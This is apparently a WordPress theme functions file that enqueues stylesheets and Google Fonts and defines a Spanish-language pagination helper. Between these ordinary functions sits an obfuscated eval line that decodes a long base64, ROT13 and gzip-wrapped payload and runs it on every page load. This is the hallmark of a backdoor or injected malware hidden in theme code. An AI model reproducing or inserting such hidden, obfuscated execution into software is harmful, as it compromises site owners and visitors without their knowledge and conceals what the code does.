<?php
function enqueue_main_styles()
{
	wp_enqueue_style('main-styles', get_template_directory_uri() . '/assets/css/main.min.css', array(), '1.0.0', 'all');
	wp_enqueue_style('remixicon', 'https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css', array(), '1.0.0', 'all');
}

add_action('wp_enqueue_scripts', 'enqueue_main_styles', 99);
// add_action('admin_enqueue_scripts', 'enqueue_main_styles');

function add_google_fonts_to_head()
{ ?>
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display&family=Lato:wght@100;300;400;700;900&display=swap" rel="stylesheet">
	<?php }

add_action('wp_head', 'add_google_fonts_to_head');
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

if (!function_exists('smpx_blog_prevnext_navigation')) :
	function smpx_blog_prevnext_navigation($args = [])
	{

		$prev = isset($args['prev']) ? $args['prev'] : '<i class="ci-chevron_big_left text-primary"></i>' . __('Anterior', 'nanua');
		$next = isset($args['next']) ? $args['next'] : __('Siguiente', 'nanua') . '<i class="ci-chevron_big_right text-primary"></i>';
		$class = isset($args['class']) ? $args['class'] : 'text-gray-500 font-medium flex justify-center items-center';

		ob_start(); ?>

		<nav class="<?php echo $class; ?>" role="navigation">
			<?php
			echo str_replace('<a', '<a class="text-gray-500 font-medium flex items-center mr-2 hover:text-primary"', get_previous_posts_link($prev, $args['query']->max_num_pages));
			echo '<span class="px-1">' . (0 == get_query_var('paged') ? 1 : get_query_var('paged')) . '</span>';
			echo '<span class="text-gray-400">' . __('de', 'nanua') . '</span>';
			echo '<span class="text-gray-400 px-1">' . $args['query']->max_num_pages . '</span>';
			echo str_replace('<a', '<a class="text-gray-500 font-medium flex items-center ml-2 hover:text-primary"', get_next_posts_link($next, $args['query']->max_num_pages));
			?>
		</nav>

<?php }
endif;
